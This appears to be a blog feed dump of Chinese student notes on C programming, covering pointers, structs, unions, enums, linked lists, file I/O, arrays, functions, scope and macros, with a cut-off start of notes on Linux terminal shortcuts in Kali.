<p>3、c语言中规定：<strong>一维数组中a[i]的地址是a+i，如果ip=a，那么也可写成ip+i（构成了循环条件，如果是指针，还可以直接写成ip++，因为指针变量不是常数）</strong></p>
<p>4、当指针变量ip取了数组a的地址的时，那么ip[i]与a[i]表示的元素一致，可<strong>看为</strong>一个数组在起作用</p>
<p>5、指针变量可进行加减整数和两指针相减的算术运算</p>
<p>（1）移动指针（指针加减整数） 例如ip+1或者ip-1看似是加减1就指向了临近的存储单元，但是实质是加减的数会乘以数据类型所占据的字节数，因为一个字节就是一个存储单元，所以这里的1，我将之理解为一<strong>块</strong>存储单元</p>
<p>（2）两指针相减：指向同一块连续的存储单元（数组）的两个指针变量可以相减（p-q），值代表两个指针变量之间的相距的元素个数，可以为负数</p>
<p>6、指向同一块连续的存储单元（数组）的指针间可以进行比较（使用所指向的数组元素的地址大小进行比较）</p>
<p>7、字符指针定义为：<em><em>char <em>sp；sp=“OK!”</em></em> ，以上把OK!这个字符串的首字符的地址赋值给字符指针，那么就可以用sp这个字符指针存取该字符串，此时与字符串数组相似，sp[1]的值为K，并且与字符串数组一致，同样是</em><em>以空字符结尾</em>*</p>
<p>8、当想使用scanf输入函数为字符指针变量赋值时，字符指针变量此时一定要能指向某个确定的地址，比如把字符数组的地址赋给字符指针，否则，字符指针将指向任意地址，可能导致程序崩溃</p>
<p>9、指针一旦指向某个地址时，去改变如*ip的任何值，都是相当于改变其指向的地址所对应的数组、变量等</p>
<p>10、二维数组中的每行的首地址为其首个元素，例如a[3] [5],第0行的首地址为a[0]（或者为a）,第1行首地址为a[1]（或者为a+1）</p>
<p>而0行第j列元素的地址为a[0]+j（或者表示为*a+j），第1行j列元素的地址为a[1]+j（或者表示为 *(a+1)+j）</p>
<p>推广到i行，j列的地址则为a[i]+j；*(a+i)+j；&amp;a[i] [j] 。若是要表示a[i] [j]则在前面的表达式加 *()</p>
<p>11、使用简单同类型指针变量存取二维数组时，给指针p赋予首地址：p=&amp;a[0] [0]；p=*a；p=a[0]（不可以用数组名进行赋值）</p>
<p>使用p指向a[i] [j]为*(p+i *列的总数+j) </p>
<p>12、int (*pi)[5]表示，定义一个整型指针（称为行指针），该指针指向一个含有五个整型元素的数组</p>
<p>13、如果有一个二维数组列数也为第12点中的5列时，此时可以执行pi=a，则此时用pi存取二维数组的用法与10中一致</p>
<p>14、定义指针数组：*<em>类型标识符 <em>指针名[元素个数]</em></em> 如果把一个二维数组的每行的首地址都给指针数组相应的指针，那么则存取二维数组的方法与10中一致</p>
<p>15、使用指针字符数组：*<em>char <em>p[字符串个数]=｛字符串｝</em></em> 会为每个字符串分配相应的空间，不会造成空间的浪费，用法与字符串数组一致</p>
<p>16、二维字符串数组，每行的首地址输出时就表示一整行的字符串（看成一个一维的字符串数组）</p>
<h3 id="三、指向指针的指针变量"><a href="#三、指向指针的指针变量" class="headerlink" title="三、指向指针的指针变量"></a>三、指向指针的指针变量</h3><p>1、指向指针的指针变量：通过多次（一般为两次）指向地址，从而指向最终的一个变量值</p>
<p>格式为：<strong>类型标识符  * * 指针变量名；</strong></p>
<p>2、可以把一个指针数组的首地址赋值给指向指针的指针变量（很好理解：指针数组里面的指针元素就代表着地址，而指针数组首地址指向这些，类似于指向指针）</p>
<h3 id="四、指针与结构体、共用体"><a href="#四、指针与结构体、共用体" class="headerlink" title="四、指针与结构体、共用体"></a>四、指针与结构体、共用体</h3><p>注：结构体与共用体较为类似，与指针的用法一致，故以下只提供一种</p>
<p>1、指向结构体：结构体同样存在连续空间，以及首地址，把这个首地址赋值给一个指针变量，则该指针指向结构体</p>
<p>格式：**struct 结构体名 *指针变量名**（c++中可省略struct）</p>
<p>2、若有一个与指针同个结构体类型的结构体变量book，则指针变量<strong>p=&amp;book</strong>，此时，p指向了book；共有三种办法存取结构体中的成员：</p>
<p>（1）<strong>book.成员名</strong> 学结构体的最基本的取用语法</p>
<p>（2）<strong>p-&gt;成员名</strong> 指针的取用语法，借用由-和&gt;组合成的指向运算符取用成员（常用）</p>
<p>（3）**(<em>p).成员名</em>* 圆括号不可省略，因为根据运算符优先级， “ . ”  的优先级高于“*”</p>
<p>3、如果是结构体数组book[i]，p=book，那么p指向book[0]，(p+1)指向book[1]······</p>
<p>4、指针变量指向带有位段的结构体变量时，用法与指向结构体一致</p>
<h3 id="五、指针与枚举型"><a href="#五、指针与枚举型" class="headerlink" title="五、指针与枚举型"></a>五、指针与枚举型</h3><p>1、指向枚举型的指针的定义与结构体、共用体一致，就不再重复说明</p>
<p>2、指向枚举型的指针，用法就一个：*<strong>p等价于e</strong>（p为指针，e为枚举型变量）</p>
<p>3、补充前面的枚举型：每个枚举型里面的枚举值，都代表着一个整数，某种意义上来说，就是一个整型的数，所以才会有类型强制类型转化的语法<strong>（enum 枚举类型名）（枚举变量+或-常数）</strong></p>
<p>所以，*p的表示，可以指向某个枚举值，也可以被转化为该枚举值对应的整型数</p>
<h3 id="六、指针与函数"><a href="#六、指针与函数" class="headerlink" title="六、指针与函数"></a>六、指针与函数</h3><p>1、指针函数：返回指针类型的函数 格式：**数据类型 *函数名(形参表)*<em>（调用函数时，</em>不用写进去，跟之前的函数调用一致，只写函数名（形参表）即可，当然需要声明的情况也别忘了）</p>
<p>2、指针函数中的return返回的值是变量的地址、数组元素的首地址、指针变量、结构体、共用体等的首地址</p>
<p>3、接触到一个新的类型标识符<strong>bool</strong>，定义之后，变量只能被赋值true或者false</p>
<p>4、<strong>指针变量</strong>作为函数的<strong>形参</strong>时，那么调用函数时，圆括号也应是<strong>某变量的地址</strong>，保持类型一致</p>
<p>当使用*指针运算符对形参进行运算就可以改变实参的值 </p>
<p>5、主函数main()的形参：带形参的主函数首部形式为*<em>int main(int argc,char <em>argv[])</em></em></p>
<p>整型argc代表命令行总的参数个数(包括程序名)，指针数组argv中每个元素指向命令行对应的参数字符串，假设有三个字符串，那么argv[0]代表输入的第一个字符串</p>
<p>6、函数名是函数的首地址，是一个地址常量，不可被改变</p>
<p>7、函数指针：指向函数的指针变量，通过指向函数的首地址，从而调用函数</p>
<p>格式：*<em>数据类型  (<em>函数指针变量名)(形参表)</em></em></p>
<p>注：函数指针与指针函数差在一个圆括号上，需注意！</p>
<p>8、定义的函数指针，可以指向<strong>一类</strong>的函数，只要<strong>数据类型和形参表中的形参类型相同（不要求形参变量相同）</strong>。就可用如p=fun给函数指针赋值，此时，p(形参)等价于fun(形参)</p>
<p>9、<strong>函数指针主要用于函数之间的传递函数，即主调函数中用其他的函数名作为实参，被调函数中函数指针作为形参，这样把函数的入口地址传给形参，从而在被调函数中使用传入的函数</strong></p>
<h3 id="七、链表（单向链表）"><a href="#七、链表（单向链表）" class="headerlink" title="七、链表（单向链表）"></a>七、链表（单向链表）</h3><p>1、结点：除了存储数据，还存储该数据的后继结构体的地址的结构体</p>
<p>链表：存储着n个数据的结点通过next指针连接下一个结点而拉成一条类似链子的数据集合</p>
<p>2、用指针函数进行建立单向链表：使用*<em>struct 结构体变量名 <em>p;p=new 结构体变量名</em></em> 开辟动态存储空间，创建的第一个空间即为头结点。头结点的地址应该存放在两个指针里面，一个用来最后的返回头结点地址，另一个用来进行创建链表，尾结点要用NULL进行置空。</p>
<p>3、单向链表结点的插入：（1）s-&gt;next=p-&gt;next;   (2)p-&gt;next=s; （s，p均为指向结构体的指针）</p>
<p>4、单向链表结点的删除：（1）p-&gt;next=q-&gt;next; (2)delete q;   （p，q均为指向结构体的指针）</p>
<h1 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h1><h3 id="一、文件概念"><a href="#一、文件概念" class="headerlink" title="一、文件概念"></a>一、文件概念</h3><p>1、文件：储存在外部存储介质上的数据集合</p>
<p>每个文件都有一个名字，称为文件名，对于文件的存取都是按照名字进行的</p>
<p>2、ASCⅠⅠ文件：由许多的字符组成的</p>
<p>二进制文件：仅将字节中的二进制按照原样输出</p>
<h3 id="二、文件指针"><a href="#二、文件指针" class="headerlink" title="二、文件指针"></a>二、文件指针</h3><p>1、缓冲文件系统会为每个文件开辟一片区域，用于存放文件的信息。存储形式采用结构体类型的变量，该变量名字为FILE（注意是<strong>大写</strong>）</p>
<p>2、所以文件指针定义为*<em>FILE <em>fp;</em></em> </p>
<h3 id="三、文件的打开和关闭"><a href="#三、文件的打开和关闭" class="headerlink" title="三、文件的打开和关闭"></a>三、文件的打开和关闭</h3><p>1、文件打开函数为<strong>fopen()</strong></p>
<p>格式为：<strong>fp=fopen(文件名,文件打开方式);</strong> （fp是文件指针，文件名：要打开的文件路径和文件全名（文件名.拓展名））<strong>注：文件名与文件打开方式要在””里面</strong>   (还有，一般还要检验文件是否成功打开，用fp是否等于NULL进行判别)</p>
<table>
<thead>
<tr>
<th align="left">文件打开方式</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td align="left">r或rt</td>
<td>以读写的方式打开一个文本文件，此文件必须存在，只能读</td>
</tr>
<tr>
<td align="left">w或wt</td>
<td>以只写的方式建立并打开一个文本文件。若文件已经存在，则打开时清空原内容，只允许写</td>
</tr>
<tr>
<td align="left">a或at</td>
<td>以追加的方式打开一个文本文件，并将写入的内容添加到文件的末尾。若文件不存在，则新建一个文本文件。</td>
</tr>
<tr>
<td align="left">rb</td>
<td>以只读的方式打开一个二进制文件，此文件必须存在，只允许读</td>
</tr>
<tr>
<td align="left">wb</td>
<td>以只写方式建立并打开一个二进制文件。若文件已经存在，则打开时清空原内容，只允许写</td>
</tr>
<tr>
<td align="left">ab</td>
<td>以追加方式打开一个二进制文件。若文件不存在，则新建一个二进制文件</td>
</tr>
<tr>
<td align="left">r+或rt+</td>
<td>以读/写方式打开一个文本文件。此文件必须存在，允许读和写</td>
</tr>
<tr>
<td align="left">w+或wt+</td>
<td>以读/写方式建立并打开一个文本文件。若文件已经存在，则打开时清空原内容，允许读和写</td>
</tr>
<tr>
<td align="left">a+或at+</td>
<td>以读/追加写方式打开一个文本文件。若文件不存在，则新建一个文本文件</td>
</tr>
<tr>
<td align="left">rb+</td>
<td>以读/写方式打开一个二进制文件，此文件必须存在，允许读和写</td>
</tr>
<tr>
<td align="left">wb+</td>
<td>以读/写方式建立并打开一个二进制文件。若文件已经存在，则打开时清空原内容，允许读和写</td>
</tr>
<tr>
<td align="left">ab+</td>
<td>以读/追加写方式打开一个二进制文件。若文件不存在，则新建一个文本文件</td>
</tr>
</tbody></table>
<p>2、如果文件打开不成功，将返回一个空指针值NULL，可以据此判断是否成功打开文件。</p>
<p>3、缓冲文件系统中，文件使用完毕要及时关闭，否则可能导致文件信息丢失，或者被误操作而损坏</p>
<p>4、文件关闭函数<strong>fclose()</strong></p>
<p>格式为：<strong>fclose(文件指针)</strong> （正常关闭函数，fclose返回值是一个整数0，否则返回EOF即-1）</p>
<h3 id="四、文件的读取和写入"><a href="#四、文件的读取和写入" class="headerlink" title="四、文件的读取和写入"></a>四、文件的读取和写入</h3><p>1、<strong>fputc(ch,fp)</strong>; 向一个允许写或者读写方式打开的文件写入一个字符（ch表示一个写入文件的字符，fp表示文件指针）（输出成功返回字符的ASCII值，失败则返回EOF即-1）</p>
<p>2、<strong>ch=fgetc(fp);</strong> 从一个允许读或者读写方式打开的文件读取一个字符（当读的是文本文件时，读取到末尾时返回EOF，即-1）</p>
<p>3、<strong>feof(fp);</strong> 判断一个文件是否到文件的末尾，到末尾则返回1，没到末尾则返回0（可用于循环语句的判断条件）</p>
<p>以上函数虽是一个个的读取，但是可用循环语句（while () 很适合）进行重复读取或写入</p>
<h3 id="五、文件的定位函数"><a href="#五、文件的定位函数" class="headerlink" title="五、文件的定位函数"></a>五、文件的定位函数</h3>]]></content>
  </entry>
  <entry>
    <title>c语言——构造数据类型与函数笔记</title>
    <url>/2020/10/22/2020-10-22-c%E8%AF%AD%E8%A8%80%E2%80%94%E2%80%94%E2%80%94%E6%9E%84%E9%80%A0%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E4%B8%8E%E5%87%BD%E6%95%B0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="构造数据类型"><a href="#构造数据类型" class="headerlink" title="构造数据类型"></a>构造数据类型</h1><h3 id="一、数组"><a href="#一、数组" class="headerlink" title="一、数组"></a>一、数组</h3><p>1、数组：一批类型性质相同的数据的集合</p>
<p>2、数组定义与之前的变量并无太大差异，只是在其后面多了维数，以及组中的个数。一维则[]中的数字表示为数组元素的总数，若二维则[] []表示几行几列（先行后列）的数据</p>
<p>3、数组名不与变量名重复，一样也不可以取用关键词作为组名，定义数组元素的个数（称为数组长度或数组大小）不能含有变量，定义为常量的可以（里面进行加减乘除也可，有具体整数值都可）</p>
<p><strong>注：不能直接引用整个数组，只能使用数组中的某个数据（字符串数组除外）</strong></p>
<p>4、数组下标从0开始，（一维数组的最后一个数据为数组长度减1，例如Score[10]，第一个元素为Score[0]最后一个元素为Score[9]）</p>
<p>5、数组的赋值有三种:（1）用循环语句进行有规律的赋值（2）循环语句中利用输入函数进行逐个输入 （3）初始化，在定义数组时，直接用花括号赋指，（按照顺序赋值，如果数据数量不够，则后面的数据直接赋值为0；如果过大，将报错）</p>
<p>6、数组名代表的是一个内存单元地址，所以若是直接使用数组名进行输入函数取值，就无需使用&amp;（应用在字符数组上）</p>
<p>7、对于数组排序的冒泡排序和选择排序，重点在于内层循环变量的取值范围变化，是朝着小变化或是朝着大变化，决定了数组排序的是从小到大还是从大到小；而内层循环变量的取值范围应该越来越小，因为已经排序的应该将之排除在外</p>
<p>8、二维数组：例如a[x] [y] （两个[]不能简写成[x,y]，是错误语法）代表数组a由x行y列组成，一共x*y个元素；表示的最大下标x-1，y-1</p>
<p>9、二维数组的存放顺序是一行一行的填充，比如先填满第0行，才会开始填第一行</p>
<p>10、二维数组的赋值：</p>
<p>（1）直接在后面跟=｛｝，里面可以直接填写数字直到满（不建议，十分不清晰）或是每一行用｛｝括起来，会清晰明了许多，各个｛｝间用“，”隔开（如果一次性写满，则可以省略行里面的数字，列不行</p>
<p>（2）如果是每行通过｛｝隔开的情况，则可以只填写该行前几列的数据，其他的将会被系统填0</p>
<p>  11、c语言中没有定义字符串类型的函数，但是可以使用数组来处理字符串，定义方式与之前的数组并无太大区别，只需注意以下几点：</p>
<p>（1）如果在初始化定义时，用单个字符定义，则每个字符需使用 ‘  ‘ 括起来，但是没有赋值的将被系统填充’\0’；故此，与之前数组一致，如果要将所有数组都变为0；则输入’\0’即可</p>
<p>（2）初始化时可以直接用字符串赋值，字符串使用”  “括起来，之后系统将会自动补充’\0’（只有结尾是空字符的字符数组可以用%s直接输出），所以如果用字符串赋值，存储的字节数将会是字符串的长度加1（所以需要注意数组长度是否够大）</p>
<p>（3）使用printf与scanf两个函数时，如果定义为%c时，后面跟的必须是如a[n]这般的某个具体的位置。需使用循环语句进行一个一个字符进行输入/输出，输入时候各个字符不必用空格隔开，因为此时空格也将被认为是一个字符存储在数组里；并且如果数值长度仍够，按下的回车键也同样会被存储在数组中</p>
<p>​        另：如果为%s，后面跟的变成如a这般的数组名，作为一个整体的地址，有个需注意，在输入函数scanf中使用时，若输入空格将会被认为是已经完成了输入</p>
<p>（4）上面的方法其实过于复杂，而对于含有字符的数组，在string的头文件中有专门的一些函数可以帮忙处理：</p>
<p>gets(字符数组名)：输入的字符串赋值给字符数组，并且空格不会被认为是结束的标志，只有回车才是，所以可以输入多个字符串</p>
<p>puts(字符数组名)：输出字符数组里的内容</p>
<p>strcat(字符数组1，字符数组2)：把字符数组2的内容直接放入字符数组1中并连接在其后面(前提是字符数组1的长度够大)</p>
<p>strcpy(字符数组1，字符数组2)：把字符数组2的内容直接复制到字符数组1中，注意是<strong>覆盖式</strong>的（前提是字符数组1的长度比2的大或等）</p>
<p>strcmp(字符数组1，字符数组2)：把字符数组1和字符数组2的字符按照从左往右的顺序进行ASCII码值的比较，直至出现不同的字符或者遇到末尾的’\0’停止；若是两者相等，则函数返回值为<strong>0</strong>；若是前者大于后者，则函数返回值为<strong>正整数</strong>；若是前者小于后者，则函数返回值为<strong>负整数</strong>（相比的为同位置的字符，一旦比出结果立刻停止比较，返回函数值）</p>
<p>strlen(字符数组)：计算字符数组中的字符个数。不包括’\0’</p>
<p>strlwr(字符数组)：把字符数组中的大写字符转换为小写字符</p>
<p>strupr(字符数组)：把字符数组中的小写字符转换为大写字符</p>
<p>12、循环结构与数组是黄金搭档，经常配合使用</p>
<p>13、定义数组时里面的[ ]可以是字母，但必须是某个具有确定的值的字母，总之值一定得是确定的</p>
<p>14、字符数组直接赋值为字符串时，可以被另一个字符串（长短不一定要一致）直接覆盖。</p>
<p>15、字符串的一维数组只能存放一个字符串，而二维数组可用来盛放多个字符串（每行存放一个字符串），其列表示每行所能容纳的最大的字符个数（会造成空间浪费，后面有指针数组，才是更好的选择）</p>
<h3 id="二、结构体"><a href="#二、结构体" class="headerlink" title="二、结构体"></a>二、结构体</h3><p>1、结构体（struct）：把若干个不同类型的变量组合到一起构成的的数据类型</p>
<p>2、声明格式：**struct 结构体名 {成员}; **  。（定义的内容，定义方式与定义变量、数组方式一致）</p>
<p>3、结构体中的各个部分称为成员，而成员名可以与结构体之外定义的变量名相同，但不能与关键字同名。</p>
<p>4、（要先声明，才能有此步骤的定义）使用结构体格式为：**struct 结构体名 变量名 **，若是要初始化，则用{}括起来，里面的数据类型按顺序且与结构体中的成员数据类型相同，如果赋值数据个数不够，则剩余补0；超过则出错</p>
<p>5、结构体将引入“.”这个符号进行对成员赋值：<strong>变量名.成员名=？</strong>进行赋值，若是出现多层嵌套的结构体，则通过多个  <strong>.</strong>  进行连接，由最外层到最内层逐层的排序</p>
<p>6、直接使用变量名代表对结构体中第一个的成员进行赋值，若对特定的某个成员赋值，需要用  <strong>.</strong></p>
<p>7、使用结构体定义的变量，就拥有了结构体中的成员作为该变量的属性，那些成员好似成为变量名头下的一个个标签</p>
<p>8、结构体数组就是把结构体定义的变量的方式换成了去定义一个数组，在处理一些相同类型的数据上可以简化代码，其余并无差别</p>
<p>9、位段：在一个结构体中使用指定长度的位（二进制位）作为单位的成员（大多数情况下是用不到的）</p>
<p>格式与结构体定义几乎一致，唯一差别就是在定义的成员后面加上   <strong>: 位的个数</strong>，如int num :8;</p>
<p>10、同个结构体名定义下的不同变量可以直接使用赋值语句用于值的交换</p>
<p>11、结构体变量所占存储空间的大小等于各个成员的存储空间之和</p>
<p>12、结构体运用在某个变量拥有多种方面的数据类型</p>
<h3 id="三、共用体"><a href="#三、共用体" class="headerlink" title="三、共用体"></a>三、共用体</h3><p>1、共用体（union）：多个不同类型数据共享空间的构造类型。在其里面的成员<em><strong>共用一个存储空间</strong></em>，都是从相同的物理地址开始</p>
<p>2、用法与结构体一致，可参考结构体的做法，直接模仿</p>
<p>3、共用体中允许嵌套。即：里面的成员可以是数组，指针，结构体和共用体（结构体也是如此）</p>
<p>4、共用体变量所占的空间大小取决于占存储空间最大的那个成员，与结构体要区分开！</p>
<p>5、在共用体初始化时只能对第一个成员的值进行初始化</p>
<p>6、共用体中的成员只能有一个成员有值，因为一旦对某个成员赋值，就会覆盖其他成员原来的数据，因此最后一次赋值是共用体起作用的数值</p>
<p>7、当共用体里面嵌套结构体时，结构体的成员共用共用体里的空间，分配顺序默认为从低地址到高地址</p>
<p>8、运用在某个数据可能用的类型有多种，而进行选择</p>
<h3 id="四、枚举类型"><a href="#四、枚举类型" class="headerlink" title="四、枚举类型"></a>四、枚举类型</h3><p>1、枚举：把变量所有可能取值一一罗列出来，增加程序的可读性</p>
<p>2、声明格式：**enum 枚举名 ｛枚举值｝;**（枚举值可为字符串（不要加双引号），将会被系统作为整型常量处理；不同的枚举值之间用’ , ‘隔开）</p>
<p>3、枚举值无特定的赋值序号时，则从0开始逐个加1递增给予序号；另外对某一枚举元素赋值序号，而其后无赋值序号，则从该序号开始加1递增</p>
<p>4、可以通过使用switch（枚举值的序号）｛｝语句来对枚举变量进行输入和输出</p>
<p>5、枚举类型定义里面的枚举元素，好像一个个存储着的值，是需要经过选择然后再将其赋值给变量，变量才能具有那个枚举值，不能使用枚举值的序号进行赋值，必须输入全名；若是要用序号赋值，需要的格式为：<strong>（enum 枚举名）（某序号）</strong></p>
<p>6、枚举值的序号可用来比大小，作为判断条件</p>
<p>7、用某类型的一个枚举变量为另一个该类型枚举变量赋上枚举值：a=(enum) 枚举名 (b+1)（a，b为同类型枚举变量，b+1表示一个标量的序号，加1只是举例，可以进行其他运算）</p>
<h3 id="五、自定义类型名"><a href="#五、自定义类型名" class="headerlink" title="五、自定义类型名"></a>五、自定义类型名</h3><p>1、自定义类型：使用typedef声明一种新的类型名来代替已有的某类型名</p>
<p>2、语法格式：<strong>typedef 某类型名 新类型名</strong> （新类型名习惯上用大写字母表示，以便与已有的进行区分）</p>
<p>3、某类型名可以是float，int这类标准数据类型；也可以是结构体，共用体，枚举；</p>
<p>4、这个关键字的用法类似一种格式刷的感觉，可以将你“刷”过的类型去把别的变量的类型变得一致</p>
<h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><h3 id="一、函数概述、自定义、调用"><a href="#一、函数概述、自定义、调用" class="headerlink" title="一、函数概述、自定义、调用"></a>一、函数概述、自定义、调用</h3><p>1、函数：是对数据进行一系列的操作，而去完成某个特定功能的过程。好似一种公式，把数据套进去一样</p>
<p>2、函数分为系统库函数与用户自定义函数，前者由编译系统提供，用户输入头文件便可以调用；而后者是程序员自行定义与设计，用来完成某项特定的功能。</p>
<p>3、自定义函数格式：<strong>类型标识符 函数名 (形式参数表){函数体（即：某种运算过程）}</strong></p>
<p><strong>注：类型标识符是执行完该函数程序，数据返回的类型定义；函数名不可以与关键字重名，在整个程序中是唯一的；｛｝后面无” ; “    函数定义中不能再定义一个新函数；形参定义格式例如 int a，int b，······</strong></p>
<p>4、形参类似一个公式里面的x，y，在使用函数时，格式应按照形参的样式进行调用；调用时便把值赋予形参进行运算然后在返回出去需要的值。（两者个数必须相等）</p>
<p>5、return 表达式或return （表达式）返回函数值，不写时，函数返回类型应该为void；写入时，结束函数体的执行，程序回到调用该函数的地方，并把其后表达式的值按照类型标识符的数据类型返回给主调函数（也就是把值输出）</p>
<p>6、跟在return后的表达式返回值的数据类型必须跟定义函数时的数据类型一致，不一致时将以定义函数时的数据类型为准，进行强制类型转换</p>
<p>7、当定义函数时省略返回值的数据类型定义，系统将默认为int型</p>
<p>8、 当把自定义函数的定义语句写到主调函数的后面时，在使用自定义函数前需要加上自定义函数的声明（格式为： 类型标识符 函数名 （类型 形参1，类型 形参2，）或者（类型，类型···））；若是函数定义写在主调函数之前则不必写声明</p>
<p>9、函数定义中不能嵌套函数，但是调用函数产生的值却可以再套在函数里面，如：min(min(a,b),min(c,d)) 计算出a,b,c,d四个里面的最小值</p>
<p>10、函数里面若包含输出语句（printf，puts等），在调用时是会输出里面的语句</p>
<h3 id="二、函数的参数传递"><a href="#二、函数的参数传递" class="headerlink" title="二、函数的参数传递"></a>二、函数的参数传递</h3><h4 id="值传递"><a href="#值传递" class="headerlink" title="值传递"></a>值传递</h4><p>1、值传递：调用函数时，主调函数把实参的值赋值给形参。</p>
<p>2、形参的值变化不会影响实参的值，形参一般为变量，实参可以是变量、常量、表达式</p>
<h4 id="地址传递"><a href="#地址传递" class="headerlink" title="地址传递"></a>地址传递</h4><p>1、地址传递：主调函数把实参的地址传递给形参，作为形参的地址</p>
<p>2、当进行的为地址传递时，形参和实参共用一个地址，共用一个存储空间，即形参的改变就是实参的改变</p>
<p>3、表示地址传递的有<strong>数组名、&amp;变量、字符串、指针变量</strong></p>
<p>4、当实参是二维数组，形参可以是一维数组，此时不能直接将实参数组名填入括号内，类型将不匹配；应填入：数组名 [0] ，在此时作为一个起始地址转变为一维数组的排列方式。二维数组关系如a[i] [j]=b[i*n+j]（i，j为双层循环的循环数，n为二维数组a的列数）</p>
<h3 id="三、函数的调用"><a href="#三、函数的调用" class="headerlink" title="三、函数的调用"></a>三、函数的调用</h3><p>1、一个函数内不能再定义另一个函数，但是函数体（即在｛｝里的内容）内可以对其他的函数进行调用，也可以调用该函数本身，对其他函数要记得声明函数即可</p>
<p>2、函数名后的括号里面可以是各种各样的表达式，可以更好调用函数，发挥出我们想要的效果</p>
<p>3、设计函数的目的在于简化程序，把每一步要做的归成一个相对独立的函数进行完成，然后在一步步的考虑其他细节，最终完成一个复杂的程序</p>
<p>4、一个函数在自身函数体内调用自己称为直接递归调用；调用其他函数称为间接递归调用；</p>
<p>5、使用直接递归调用需满足两个条件：（1）递归模式，好似数学中的单个函数自身层层嵌套，有点循环语句的感觉，但却能完成一些循环语句难以完成的程序（2）递归出口，一般到1或0脱离递归</p>
<p>6、当函数在不同源文件时一样可以调用函数，只需在调用之前进行函数声明即可</p>
<h3 id="四、变量的作用域和生存期"><a href="#四、变量的作用域和生存期" class="headerlink" title="四、变量的作用域和生存期"></a>四、变量的作用域和生存期</h3><p>1、变量的作用域指变量的有效范围，即可以引用变量的区域；分为全局变量和局部变量。</p>
<p>局部变量：在定义的代码块内定义且作用</p>
<p>全局变量：在函数外部定义的变量，作用域从定义开始直到源文件结束，但是如果在某个函数内有同名的局部变量，则局部变量的值生效，全局变量值被隐藏</p>
<p>2、代码块：在一对花括号里面的代码段，包括函数体以及函数体内的语句块</p>
<p>3、在每个代码块内定义的变量都只能在其内使用，所以可以在不同的代码块使用相同的变量名，并且不会互相干扰，比如：在一个函数内定义i为10；则在整个函数内i都有一个为10的值；而在此时使用了如if语句，且是使用了｛i=0｝，那么在if的花括号里，i为0，但是不在花括号里的i仍然为10。我理解为优先级别问题，级别高优先展示，却不会覆盖</p>
<p>4、变量的生存期：变量值在程序运行过程中存在的期限，即从系统为变量分配存储单元开始到将存储单元收回为止。</p>
<p>5、C语言程序占据的存储空间分为程序区、静态存储区和动态存储区</p>
<p>程序区：用于存放程序</p>
<p>静态存储区：程序开始执行时就分配的固定存储单元，如全局变量。其生存期从程序运行开始到程序的结束</p>
<p>动态存储区：函数调用过程中进行动态分配的存储单元，如函数形参、自动变量、函数调用时的现场保护和返回值地址。其生存期从定义变量开始到函数（或复合语句）运行结束为止</p>
<p>6、一些说明存储类型的关键字：（1）auto 自动变量（2）static 静态变量 （3）register 寄存器变量 （4）extern （外部变量）（存储类型关键字写在以前定义变量最前面，或者写在类型标识符和变量之间）</p>
<p>7、（1）未说明存储类型的变量默认为自动变量，所以auto常常省略；</p>
<p>（2）使用static 静态变量只会初始化一次，之后再次使用，不会再进行赋值，其值应该为上次调用后的值；</p>
<p>（3）register 寄存器变量：借用寄存器可以使得运算更快，但是寄存器数量有限，不够时，将自动转为自动变量。并且寄存器长度有限，寄存器变量只能是字符型、整型、指针类型的变量；</p>
<p>（4）外部变量 ：是定义在函数外部的全局变量（存放在静态存储区）。使用extern声明外部变量时，可以把之后定义的外部变量的作用域提前到extern定义的位置，或者在不同的源文件里面使用变量</p>
<p>（5）如果在定义全局变量时加一个static会构成静态全局变量。那么将无法使用extern进行拓展作用域到其他源文件中，但是可以通过同在一个源文件内的函数进行间接调用</p>
<h3 id="五、宏定义"><a href="#五、宏定义" class="headerlink" title="五、宏定义"></a>五、宏定义</h3><p>1、宏定义：将一个标识符（宏名）定义为一个字符串。分为无参宏定义与带参宏定义</p>
<p>2、无参宏定义：定义一个没有参数的宏。语法格式：**#define 宏名 字符串**</p>
<p>（1）不需要在后面在分号“  ；”</p>
<p>（2）宏定义使用一个宏名代替一个字符串，仅仅是简单的替换，不分配内存空间</p>
<p>（3）宏定义可以引用已经定义的宏定义，进行嵌套</p>
<p>（4）宏定义过的宏名在整个作用域内不能在改变</p>
<p>（5）宏定义可与常量用法相似，用数字去替换宏名</p>
<p>（6）程序中如果在为宏名加上了双引号，将表示为一个字符串，而不是一个宏，所以此时不会进行宏替换</p>
<p>3、带参宏定义：定义一个带形式参数的宏。语法格式：**#define 宏名(形参表) 字符串** 。  </p>
<p>调用带参宏时格式为：<strong>宏名(实参表)</strong>  [其用法与函数的形参与实参相类似，可进行串记（但不能混为一谈）]</p>
<p>（1）形参（实参）表是指一至多个的形参，形参间用逗号隔开</p>
<p>（2）实参可以是常量、变量或表达式</p>
<p>（3）带参宏中的宏名与其后的左括号 ( 之间不能有空格，否则将会被系统认为是无参宏定义</p>
<p>（4）带参宏定义一般把形参用圆括号括起来，防止有些出现错误，例如：#define H(x) x*x</p>
<p>当H(10+1)时，宏展开为10+1 * 10+1 。显然这不是我们想要的结果，应写成#define H(x) (x)*(x)</p>
<p> （5）宏展开可以得到若干个的结果</p>
]]></content>
  </entry>
  <entry>
    <title>小试Linux——笔记</title>
    <url>/2020/10/18/2020-10-18-%E5%B0%8F%E8%AF%95Linux%E2%80%94%E2%80%94%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h5 id="我使用VMware虚拟机来安装kali-Linux系统（具体安装教程，可自行搜索，或者是b站上查询）"><a href="#我使用VMware虚拟机来安装kali-Linux系统（具体安装教程，可自行搜索，或者是b站上查询）" class="headerlink" title="我使用VMware虚拟机来安装kali Linux系统（具体安装教程，可自行搜索，或者是b站上查询）"></a>我使用VMware虚拟机来安装kali Linux系统（具体安装教程，可自行搜索，或者是b站上查询）</h5><h4 id="一、快捷键"><a href="#一、快捷键" class="headerlink" title="一、快捷键"></a>一、快捷键</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs Linux">Up(Down) 上（下）一条指令<br>Ctrl + c 终止当前进程<br>Ctrl + z 挂起当前进程，使用“fg”可唤醒<br>Ctrl + d 删除光标处的字符<br>Ctrl + l 清屏<br>Ctrl + a 移动到命令行首<br>Ctrl + e 移动到命令行尾<br>Ctrl + b 按单词后移（向左）<br>Ctrl + f 按单词前移（向右）<br>Ctrl + Shift + c 复制 <br>Ctrl + Shift + v 